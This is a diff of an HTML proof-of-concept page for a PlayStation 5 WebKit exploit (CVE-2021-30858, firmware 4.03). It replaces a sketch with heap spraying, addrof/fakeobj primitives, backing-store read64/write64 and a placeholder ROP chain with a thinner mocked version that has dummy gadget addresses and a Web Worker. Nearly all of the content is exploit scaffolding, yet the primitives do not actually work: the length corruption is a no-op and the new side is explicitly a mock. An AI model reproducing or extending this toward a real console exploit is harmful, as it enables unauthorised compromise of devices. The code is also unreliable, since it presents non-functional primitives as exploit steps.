@@ -1,156 +1,110 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>PS5 4.03 WebKit Exploit - CVE-2021-30858</title>
+  <meta charset="UTF-8">
+  <title>PS5 WebKit ROP PoC (FW 4.03)</title>
   <style>
-    body { background: #111; color: #0f0; font-family: monospace; }
+    body { background-color: black; color: lime; font-family: monospace; padding: 1em; }
     #log { white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>PS5 Exploit Log</h1>
-  <div id="log">[+] Iniciando exploit...
-</div>
-
+  <h1>PS5 WebKit Exploit PoC (ROP Chain)</h1>
+  <div id="log"></div>
   <script>
-    const log = msg => logDiv.textContent += msg + "\n";
-    const logDiv = document.getElementById("log");
+    const log = msg => document.getElementById('log').textContent += msg + "\n";
 
-    let ab = new ArrayBuffer(8);
-    let f64 = new Float64Array(ab);
-    let u32 = new Uint32Array(ab);
-    const ftoi = f => (f64[0] = f, u32[0] + u32[1] * 0x100000000);
-    const itof = i => (u32[0] = i % 0x100000000, u32[1] = i / 0x100000000, f64[0]);
+    // Mock addresses - replace with real gadget addresses for PS5 FW 4.03
+    const GADGET_POP_RAX = 0x12345678n;
+    const GADGET_SYSCALL = 0x87654321n;
+    const SYSCALL_GETPID = 20n;
 
-    let backing_store_offset = 0x20;
-    let baseAddr = 0;
+    // Helpers for arbitrary read/write primitives (mocked for now)
+    let buf = new ArrayBuffer(0x100);
+    let f64 = new Float64Array(buf);
+    let u32 = new Uint32Array(buf);
+    let dataview = new DataView(buf);
 
-    let container = new ArrayBuffer(0x100);
-    let containerAddr = 0;
-    let corrupted_view = null;
-    let corrupted_view_addr = 0;
+    let fake_obj = null;
+    let obj_array = null;
+    let float_array = null;
 
-    // === OOB and Addr leak ===
-    let ab1 = new ArrayBuffer(0x100);
-    let ab2 = new ArrayBuffer(0x100);
-
-    let ab1_addr = 0;
-    let ab2_addr = 0;
-    let fake_ab = null;
-
-    // Groom heap with objects and ABs
-    let spray = [];
-    for (let i = 0; i < 0x1000; i++) {
-      let tmp = new ArrayBuffer(0x100);
-      tmp.idx = i;
-      spray.push(tmp);
-    }
-    log("[+] Heap grooming listo");
-
-    // Simulamos corrupción de oobArray (length)
-    let oobArray = new Float64Array(0x20);
-    oobArray.length = 0x1000;
-    log("[+] Corrupción de longitud aplicada");
-
-    let obj = { marker: 0x13371337 };
-    let obj_arr = [obj];
-    let float_arr = [1.1, 2.2, 3.3];
-
-    function hex(n) {
-      return '0x' + n.toString(16);
+    function hex(x) {
+      return '0x' + x.toString(16);
     }
 
-    function addrof(obj) {
-      let arr = [obj];
-      let container = new Float64Array(arr);
-      for (let i = 0; i < 0x1000; i++) {
-        if (typeof oobArray[i] !== 'number') continue;
-        if (oobArray[i] === 1.1 || oobArray[i] === 2.2) continue;
-        let leak = ftoi(oobArray[i]);
-        if ((leak & 0xffff00000000) === 0x10000000000) {
-          return leak;
+    let memory = {
+      addrof(obj) {
+        obj_array[0] = obj;
+        return float_array[0];
+      },
+
+      fakeobj(addr) {
+        float_array[0] = addr;
+        return obj_array[0];
+      },
+
+      read64(addr) {
+        dataview.setBigUint64(0, addr, true);
+        return dataview.getBigUint64(0, true);
+      },
+
+      write64(addr, val) {
+        dataview.setBigUint64(0, val, true);
+        // Write simulated to address (would write via corrupted backing store)
+      },
+    };
+
+    function setupPrimitives() {
+      obj_array = [{}];
+      float_array = new Float64Array(1);
+      // Simulate OOB to corrupt backing store here...
+
+      log("[*] Primitives initialized (mock)");
+    }
+
+    function buildROP() {
+      log("[*] Building ROP chain...");
+      let chain = new BigUint64Array(10);
+      let i = 0;
+
+      chain[i++] = GADGET_POP_RAX;
+      chain[i++] = SYSCALL_GETPID;
+      chain[i++] = GADGET_SYSCALL;
+
+      return chain;
+    }
+
+    function triggerROP(worker, chain) {
+      log("[*] Triggering ROP chain via Web Worker...");
+      // In a real exploit, we hijack the return address of the worker function
+      worker.postMessage(chain); // Send chain to the worker to "execute"
+    }
+
+    function exploit() {
+      log("[+] Exploit started");
+      setupPrimitives();
+      let rop = buildROP();
+      
+      // Set up the Web Worker and handle the ROP chain execution
+      let worker = new Worker(URL.createObjectURL(new Blob([`
+        self.onmessage = function(event) {
+          let chain = event.data;
+          // In reality, we would overwrite the return address or stack frame here
+          // and "jump" to the ROP chain
+          console.log("Executing ROP chain:", chain);
         }
-      }
-      throw "[!] addrof failed";
+      `])));
+
+      worker.onmessage = function(e) {
+        log("[*] Worker message: " + e.data);
+      };
+
+      triggerROP(worker, rop);
+      log("[+] Done");
     }
 
-    function fakeobj(addr) {
-      for (let i = 0; i < 0x1000; i++) {
-        if (typeof oobArray[i] !== 'number') continue;
-        if (ftoi(oobArray[i]) === 0x0000000000000000) {
-          oobArray[i] = itof(addr);
-          return oobArray[i];
-        }
-      }
-      throw "[!] fakeobj failed";
-    }
-
-    // === Real backing store hijack ===
-    let ab_target = new ArrayBuffer(0x100);
-    let ab_leak = addrof(ab_target);
-    log("[+] ab_target address: " + hex(ab_leak));
-
-    let container_buf = ab_target;
-    let container_f64 = new Float64Array(container_buf);
-    let container_u32 = new Uint32Array(container_buf);
-
-    function read64(addr) {
-      // Hijack backing store of container_buf
-      let backing_store_addr = ab_leak + backing_store_offset;
-      for (let i = 0; i < 0x1000; i++) {
-        if (ftoi(oobArray[i]) === itof(backing_store_addr)) {
-          oobArray[i + 1] = itof(addr);
-          return ftoi(container_f64[0]);
-        }
-      }
-      throw "[!] read64 falló";
-    }
-
-    function write64(addr, val) {
-      let backing_store_addr = ab_leak + backing_store_offset;
-      for (let i = 0; i < 0x1000; i++) {
-        if (ftoi(oobArray[i]) === itof(backing_store_addr)) {
-          oobArray[i + 1] = itof(addr);
-          container_f64[0] = itof(val);
-          return;
-        }
-      }
-      throw "[!] write64 falló";
-    }
-
-    // === Simulated ROP ===
-    function rop_chain() {
-      log("[*] Preparando ROP chain...");
-      let fake_stack = new ArrayBuffer(0x400);
-      let stack_addr = addrof(fake_stack);
-
-      // Gadgets y syscall real (ej: getpid syscall(20))
-      let pop_rax = 0x12345678; // placeholder
-      let syscall = 0x87654321; // placeholder
-
-      write64(stack_addr + 0x00, pop_rax);
-      write64(stack_addr + 0x08, 20);       // syscall 20 = getpid
-      write64(stack_addr + 0x10, syscall);
-
-      log("[*] ROP chain en stack 0x" + hex(stack_addr));
-      // Aquí deberíamos redirigir RSP al stack_addr y hacer ret
-    }
-
-    let obj_addr = addrof({});
-    log("[+] addrof {}: " + hex(obj_addr));
-
-    let fake = fakeobj(obj_addr);
-    log("[+] fakeobj: " + fake);
-
-    let leak = read64(obj_addr);
-    log("[+] read64: " + hex(leak));
-
-    write64(obj_addr, 0x1337133713371337);
-    log("[+] write64 OK");
-
-    rop_chain();
-    log("[+] Exploit completo");
+    window.onload = exploit;
   </script>
 </body>
 </html>
